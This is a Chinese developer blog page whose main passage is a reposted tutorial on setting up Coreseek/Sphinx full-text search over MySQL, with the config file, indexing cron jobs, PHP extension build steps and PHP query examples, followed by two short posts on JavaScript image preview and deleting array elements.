<p>依次安装后，从新编译coreseek，然后再生成索引，就可以通过了。<br>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Coreseek Fulltext 4.1 [ Sphinx 2.0.2-dev (r2922)]  </span><br><span class="line">Copyright (c) 2007-2011,  </span><br><span class="line">Beijing Choice Software Technologies Inc (http://www.coreseek.com)  </span><br><span class="line"> </span><br><span class="line">using config file &apos;etc/csft.conf&apos;...  </span><br><span class="line">index &apos;xml&apos;: query &apos;网络搜索 &apos;: returned 1 matches of 1 total in 0.000 sec  </span><br><span class="line"> </span><br><span class="line">displaying matches:  </span><br><span class="line">1. document=1, weight=1590, published=Thu Apr  1 07:20:07 2010, author_id=1  </span><br><span class="line"> </span><br><span class="line">words:  </span><br><span class="line">1. &apos;网络&apos;: 1 documents, 1 hits  </span><br><span class="line">2. &apos;搜索&apos;: 2 documents, 5 hits</span><br></pre></td></tr></table></figure></p>
<p><strong>下面开始sphinx与mysql的配置</strong><br>创建sphinx统计表，在coreseek_test库中执行。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sph_counter</span><br><span class="line">(</span><br><span class="line">    counter_id <span class="built_in">INTEGER</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    max_doc_id <span class="built_in">INTEGER</span> <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>创建配置sphinx与mysql的配置文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/local/coreseek/etc/csft_mysql.conf</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">#MySQL数据源配置，详情请查看：http://www.coreseek.cn/docs/coreseek_4.1-sphinx_2.0.1-beta.html#conf-reference</span><br><span class="line"></span><br><span class="line">#源定义</span><br><span class="line">source main</span><br><span class="line">&#123;</span><br><span class="line">    type                    = mysql</span><br><span class="line"></span><br><span class="line">    sql_host                = localhost</span><br><span class="line">    sql_user                = root</span><br><span class="line">    sql_pass                = 123456 </span><br><span class="line">    sql_db                  = coreseek_test</span><br><span class="line">    sql_port                = 3306</span><br><span class="line">    sql_query_pre           = SET NAMES utf8</span><br><span class="line">    sql_query_pre        = REPLACE INTO sph_counter SELECT 1,MAX(id) FROM hr_spider_company;</span><br><span class="line">    sql_query               = SELECT * FROM hr_spider_company WHERE id&lt;=( SELECT max_doc_id FROM sph_counter WHERE counter_id=1 ) </span><br><span class="line">                                                         #sql_query第一列id需为整数</span><br><span class="line">                                                         #title、content作为字符串/文本字段，被全文索引</span><br><span class="line">    sql_attr_uint            = id                        #从SQL读取到的值必须为整数</span><br><span class="line">    sql_attr_uint            = from_id                #从SQL读取到的值必须为整数，不支持全文检索</span><br><span class="line">    sql_attr_uint            = link_id                #从SQL读取到的值必须为整数，不支持全文检索</span><br><span class="line">    sql_attr_uint            = add_time                #从SQL读取到的值必须为整数，不支持全文检索</span><br><span class="line">    sql_field_string         = link_url                 #字符串字段(可全文搜索，可返回原始文本信息)</span><br><span class="line">    sql_field_string          = company_name          #字符串字段(可全文搜索，可返回原始文本信息)</span><br><span class="line">    sql_field_string          = type_name             #字符串字段(可全文搜索，可返回原始文本信息)</span><br><span class="line">    sql_field_string          = trade_name             #字符串字段(可全文搜索，可返回原始文本信息)</span><br><span class="line">    sql_field_string          = email                 #字符串字段(可全文搜索，可返回原始文本信息)</span><br><span class="line">    sql_field_string          = description             #字符串字段(可全文搜索，可返回原始文本信息)</span><br><span class="line"></span><br><span class="line">    sql_query_info_pre      = SET NAMES utf8         #命令行查询时，设置正确的字符集</span><br><span class="line">    sql_query_info            = SELECT id,from_id,link_id,company_name,type_name,trade_name,address,description, FROM_UNIXTIME(add_time) AS add_time  FROM hr_spider_company  WHERE id=$id                     #命令行查询时，从数据库读取原始数据信息</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">source delta : main  </span><br><span class="line">&#123;  </span><br><span class="line">    sql_query_pre           = SET NAMES utf8  </span><br><span class="line">    sql_query               = SELECT * FROM hr_spider_company WHERE id&gt;( SELECT max_doc_id FROM sph_counter WHERE counter_id=1 )</span><br><span class="line">    sql_query_post_index    = REPLACE INTO sph_counter SELECT 1,MAX(id) FROM hr_spider_company</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#index定义</span><br><span class="line">index main</span><br><span class="line">&#123;</span><br><span class="line">    source                = main                         #对应的source名称</span><br><span class="line">    path                  = /usr/local/coreseek/var/data/mysql     #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/...</span><br><span class="line">    docinfo               = extern</span><br><span class="line">    mlock                 = 0</span><br><span class="line">    morphology            = none</span><br><span class="line">    min_word_len          = 1</span><br><span class="line">    html_strip            = 0</span><br><span class="line"></span><br><span class="line">    #中文分词配置，详情请查看：http://www.coreseek.cn/products-install/coreseek_mmseg/</span><br><span class="line">    charset_dictpath     = /usr/local/mmseg3/etc/          #BSD、Linux环境下设置，/符号结尾</span><br><span class="line">    charset_type        = zh_cn.utf-8</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">index delta : main  </span><br><span class="line">&#123;  </span><br><span class="line">    source          = delta  </span><br><span class="line">    path            = /usr/local/coreseek/var/data/delta </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#全局index定义</span><br><span class="line">indexer</span><br><span class="line">&#123;</span><br><span class="line">    mem_limit            = 128M</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#searchd服务定义</span><br><span class="line">searchd</span><br><span class="line">&#123;</span><br><span class="line">    listen              = 9312</span><br><span class="line">    read_timeout        = 5</span><br><span class="line">    max_children        = 30</span><br><span class="line">    max_matches         = 1000</span><br><span class="line">    seamless_rotate     = 0</span><br><span class="line">    preopen_indexes     = 0</span><br><span class="line">    unlink_old          = 1</span><br><span class="line">    pid_file         = /usr/local/coreseek/var/log/searchd_mysql.pid   #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/...</span><br><span class="line">    log             = /usr/local/coreseek/var/log/searchd_mysql.log        #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/...</span><br><span class="line">    query_log         = /usr/local/coreseek/var/log/query_mysql.log    #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/...</span><br><span class="line">    binlog_path     =                                              #关闭binlog日志</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我的测试表名为hr_spider_company，你只需要根据实际需求更改为自己的表名即可。</p>
<p>调用命令列表：<br>启动后台服务（必须开启）<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/coreseek/bin/searchd -c /usr/local/coreseek/etc/csft_mysql.conf</span><br></pre></td></tr></table></figure></p>
<p>执行索引（查询、测试前必须执行一次）<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/coreseek/bin/indexer -c /usr/local/coreseek/etc/csft_mysql.conf --all --rotate</span><br></pre></td></tr></table></figure></p>
<p>执行增量索引<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/coreseek/bin/indexer -c /usr/local/coreseek/etc/csft_mysql.conf delta --rotate</span><br></pre></td></tr></table></figure></p>
<p>合并索引<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/coreseek/bin/indexer -c /usr/local/coreseek/etc/csft_mysql.conf --merge main delta --rotate --merge-dst-range deleted 0 0</span><br></pre></td></tr></table></figure></p>
<p>(为了防止多个关键字指向同一个文档加上–merge-dst-range deleted 0 0)<br>后台服务测试<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/coreseek/bin/search -c /usr/local/coreseek/etc/csft_mysql.conf  aaa</span><br></pre></td></tr></table></figure></p>
<p>关闭后台服务<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/coreseek/bin/searchd -c /usr/local/coreseek/etc/csft_mysql.conf --stop</span><br></pre></td></tr></table></figure></p>
<p>自动化命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * /bin/sh /usr/local/coreseek/bin/indexer -c /usr/local/coreseek/etc/csft_mysql.conf delta --rotate</span><br><span class="line">*/5 * * * * /bin/sh /usr/local/coreseek/bin/indexer -c /usr/local/coreseek/etc/csft_mysql.conf --merge main delta --rotate --merge-dst-range deleted 0 0</span><br><span class="line">30 1 * * *  /bin/sh /usr/local/coreseek/bin/indexer -c /usr/local/coreseek/etc/csft_mysql.conf --all --rotate</span><br></pre></td></tr></table></figure>
<p>以上任务计划的意思是：每隔一分钟执行一遍增量索引，每五分钟执行一遍合并索引，每天1:30执行整体索引。</p>
<p><strong>Sphinx扩展安装</strong><br>Coreseek官方教程中建议php使用直接include一个php文件进行操作，事实上php有独立的sphinx模块可以直接操作coreseek(coreseek就是sphinx！)已经进入了php的官方函数库，而且效率的提升不是一点点！但php模块依赖于libsphinxclient包。<br><strong>[第一步] 安装依赖libsphinxclient</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> cd /var/install/coreseek-4.1-beta/csft-4.1/api/libsphinxclient/</span><br><span class="line"><span class="meta">#</span> ./configure  --prefix=/usr/local/sphinxclient</span><br><span class="line"></span><br><span class="line">configure: creating ./config.status</span><br><span class="line">config.status: creating Makefile</span><br><span class="line">config.status: error: cannot find input file: Makefile.in   #报错configure失败    </span><br><span class="line"></span><br><span class="line">//处理configure报错</span><br><span class="line">编译过程中报了一个config.status: error: cannot find input file: src/Makefile.in这个的错误，然后运行下列指令再次编译就能通过了：</span><br><span class="line"><span class="meta">#</span> aclocal</span><br><span class="line"><span class="meta">#</span> libtoolize --force</span><br><span class="line"><span class="meta">#</span> automake --add-missing</span><br><span class="line"><span class="meta">#</span> autoconf</span><br><span class="line"><span class="meta">#</span> autoheader</span><br><span class="line"><span class="meta">#</span> make clean</span><br><span class="line"></span><br><span class="line">//从新configure编译</span><br><span class="line"><span class="meta">#</span> ./configure</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
<p><strong>[第二步] 安装sphinx的PHP扩展</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://pecl.php.net/package/sphinx</span><br><span class="line"><span class="meta">#</span> wget http://pecl.php.net/get/sphinx-1.3.0.tgz</span><br><span class="line"><span class="meta">#</span> tar zxvf sphinx-1.3.0.tgz</span><br><span class="line"><span class="meta">#</span> cd sphinx-1.3.0</span><br><span class="line"><span class="meta">#</span> phpize</span><br><span class="line"><span class="meta">#</span> ./configure --with-php-config=/usr/bin/php-config --with-sphinx=/usr/local/sphinxclient</span><br><span class="line"><span class="meta">#</span> make &amp;&amp; make install</span><br><span class="line"><span class="meta">#</span> cd /etc/php.d/</span><br><span class="line"><span class="meta">#</span> cp gd.ini  sphinx.ini</span><br><span class="line"><span class="meta">#</span> vi sphinx.ini</span><br><span class="line"></span><br><span class="line">extension=sphinx.so</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> service php-fpm restart</span><br></pre></td></tr></table></figure></p>
<p>打开phpinfo看一下是否已经支持了sphinx模块。</p>
<p><strong>php调用sphinx示例：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $s = <span class="keyword">new</span> SphinxClient;</span><br><span class="line">    $s-&gt;setServer(<span class="string">"127.0.0.1"</span>, <span class="number">9312</span>);</span><br><span class="line"></span><br><span class="line">    $s-&gt;setMatchMode(SPH_MATCH_PHRASE);</span><br><span class="line">    $s-&gt;setMaxQueryTime(<span class="number">30</span>);</span><br><span class="line">    $res = $s-&gt;query(<span class="string">"宝马"</span>,<span class="string">'main'</span>); <span class="comment">#[宝马]关键字，[main]数据源source</span></span><br><span class="line">    $err = $s-&gt;GetLastError();</span><br><span class="line">    var_dump(array_keys($res[<span class="string">'matches'</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.<span class="string">"通过获取的ID来读取数据库中的值即可。"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">    var_dump($res);</span><br><span class="line">    var_dump($err);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br></pre></td></tr></table></figure></p>
<p>调用示例二：支持分页<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"./sphinxapi.php"</span>);</span><br><span class="line">    $s = <span class="keyword">new</span> SphinxClient;</span><br><span class="line">    $s-&gt;setServer(<span class="string">"192.168.252.132"</span>, <span class="number">9312</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//SPH_MATCH_ALL, 匹配所有查询词(默认模式); SPH_MATCH_ANY, 匹配查询词中的任意一个; SPH_MATCH_EXTENDED2, 支持特殊运算符查询</span></span><br><span class="line">    $s-&gt;setMatchMode(SPH_MATCH_ALL);</span><br><span class="line">    $s-&gt;setMaxQueryTime(<span class="number">30</span>);										<span class="comment">//设置最大搜索时间</span></span><br><span class="line">	$s-&gt;SetArrayResult(<span class="keyword">false</span>);										<span class="comment">//是否将Matches的key用ID代替</span></span><br><span class="line">	$s-&gt;SetSelect ( <span class="string">"*"</span> );											<span class="comment">//设置返回信息的内容,等同于SQL</span></span><br><span class="line">	$s-&gt;SetRankingMode(SPH_RANK_BM25);								<span class="comment">//设置评分模式，SPH_RANK_BM25可能使包含多个词的查询的结果质量下降。 </span></span><br><span class="line">	<span class="comment">//$s-&gt;SetSortMode(SPH_SORT_EXTENDED);							//发现增加此参数会使结果不准确</span></span><br><span class="line">	<span class="comment">//$s-&gt;SetSortMode(SPH_SORT_EXTENDED,"from_id asc,id desc");		//设置匹配项的排序模式, SPH_SORT_EXTENDED按一种类似SQL的方式将列组合起来，升序或降序排列。</span></span><br><span class="line">	$weights = <span class="keyword">array</span> (<span class="string">'company_name'</span> =&gt; <span class="number">20</span>);</span><br><span class="line">	$s-&gt;SetFieldWeights($weights);									<span class="comment">//设置字段权重</span></span><br><span class="line">	$s-&gt;SetLimits ( <span class="number">0</span>, <span class="number">30</span>, <span class="number">1000</span>, <span class="number">0</span> );								<span class="comment">//设置结果集偏移量  SetLimits (便宜量,匹配项数目,查询的结果集数默认1000,阀值达到后停止)</span></span><br><span class="line">	<span class="comment">//$s-&gt;SetFilter ( $attribute, $values, $exclude=false );		//设置属性过滤</span></span><br><span class="line">	<span class="comment">//$s-&gt;SetGroupBy ( $attribute, $func, $groupsort="@group desc" );	//设置分组的属性</span></span><br><span class="line">    $res = $s-&gt;query(<span class="string">'@* "汽车"'</span>,<span class="string">'main'</span>,<span class="string">'--single-0-query--'</span>); <span class="comment">#[宝马]关键字，[news]数据源source</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//代码高亮</span></span><br><span class="line">	$tags = <span class="keyword">array</span>();</span><br><span class="line">	$tags_name = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($res[<span class="string">'matches'</span>] <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">		$tags[] = $value[<span class="string">'attrs'</span>];</span><br><span class="line">  		$company_name[] = $value[<span class="string">'attrs'</span>][<span class="string">'company_name'</span>];</span><br><span class="line">  		$description[] = $value[<span class="string">'attrs'</span>][<span class="string">'description'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	$company_name = $s-&gt;BuildExcerpts ($company_name, <span class="string">'main'</span>, <span class="string">'汽车'</span>, $opts=<span class="keyword">array</span>() );		<span class="comment">//执行高亮，这里索引名字千万不能用*</span></span><br><span class="line">	$description = $s-&gt;BuildExcerpts ($description, <span class="string">'main'</span>, <span class="string">'汽车'</span>, $opts=<span class="keyword">array</span>() );		<span class="comment">//执行高亮，这里索引名字千万不能用*</span></span><br><span class="line">	<span class="keyword">foreach</span>($tags <span class="keyword">as</span> $k=&gt;$v)</span><br><span class="line">	&#123;</span><br><span class="line">		$tags[$k][<span class="string">'company_name'</span>] = $company_name[$k];	<span class="comment">//高亮后覆盖</span></span><br><span class="line">		$tags[$k][<span class="string">'description'</span>] = $description[$k];	<span class="comment">//高亮后覆盖</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 高亮后覆盖</span></span><br><span class="line">	$i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">foreach</span>($res[<span class="string">'matches'</span>] <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">		$res[<span class="string">'matches'</span>][$key] = $tags[$i];</span><br><span class="line">		$i++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    $err = $s-&gt;GetLastError();</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">    var_export($res);</span><br><span class="line">    var_export($err);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br></pre></td></tr></table></figure></p>
<p>还有很对地方需要参考：<a href="http://www.coreseek.cn/docs/coreseek_4.1-sphinx_2.0.1-beta.html#api-reference" target="_blank" rel="noopener">http://www.coreseek.cn/docs/coreseek_4.1-sphinx_2.0.1-beta.html#api-reference</a></p>
<p>转载自 <a href="http://blog.csdn.net/e421083458/article/details/21529969" target="_blank" rel="noopener">http://blog.csdn.net/e421083458/article/details/21529969</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/03/11/用javascript实现本地图片预览(HTML5)/"><span>用javascript实现本地图片预览(HTML5)</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/03/11/用javascript实现本地图片预览(HTML5)/" rel="bookmark">
        <time class="entry-date published" datetime="2015-03-11T02:56:51.000Z">
          2015-03-11
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>使用FileReader实现打开本地图片并预览。<br>挺方便的，可惜不是所有浏览器都支持，坑爹的IE。 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">preImg</span>(<span class="params">sourceId, targetId</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">if</span> (<span class="keyword">typeof</span> FileReader === <span class="string">'undefined'</span>) &#123;</span></span><br><span class="line"><span class="javascript">		alert(<span class="string">'Your browser does not support FileReader...'</span>);</span></span><br><span class="line"><span class="javascript">		<span class="keyword">return</span>;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	reader.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> img = <span class="built_in">document</span>.getElementById(targetId);</span></span><br><span class="line"><span class="javascript">		img.src = <span class="keyword">this</span>.result;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="javascript">	reader.readAsDataURL(<span class="built_in">document</span>.getElementById(sourceId).files[<span class="number">0</span>]);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"imgOne"</span> <span class="attr">id</span>=<span class="string">"imgOne"</span> <span class="attr">onchange</span>=<span class="string">"preImg(this.id,'imgPre');"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">"imgPre"</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">style</span>=<span class="string">"display: block;"</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>转载自 <a href="http://crayster.iteye.com/blog/1543058" target="_blank" rel="noopener">http://crayster.iteye.com/blog/1543058</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/03/04/js数组删除元素/"><span>js数组删除元素</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/03/04/js数组删除元素/" rel="bookmark">
        <time class="entry-date published" datetime="2015-03-04T03:36:41.000Z">
          2015-03-04
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>];</span><br></pre></td></tr></table></figure>
<p>若要删除其中的’b’,有两种方法：<br><strong>1.delete方法:delete arr[1]</strong><br>这种方式数组长度不变,此时arr[1]变为undefined了,但是也有好处原来数组的索引也保持不变,此时要遍历数组元素可以才用<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(index <span class="keyword">in</span> arr)</span><br><span class="line">&#123;</span><br><span class="line">　　 <span class="built_in">document</span>.write(<span class="string">'arr['</span>+index+<span class="string">']='</span>+arr[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这种遍历方式跳过其中undefined的元素</p>
<ul>
<li>该方式IE4.o以后都支持了</li>
</ul>
<p><strong>2.数组对象splice方法:arr.splice(1,1);</strong><br>这种方式数组长度相应改变,但是原来的数组索引也相应改变<br>splice参数中第一个1,是删除的起始索引(从0算起),在此是数组第二个元素<br>第二个1,是删除元素的个数,在此只删除一个元素,即’b’;<br>此时遍历数组元素可以用普通遍历数组的方式,比如for,因为删除的元素在<br>数组中并不保留</p>
<ul>
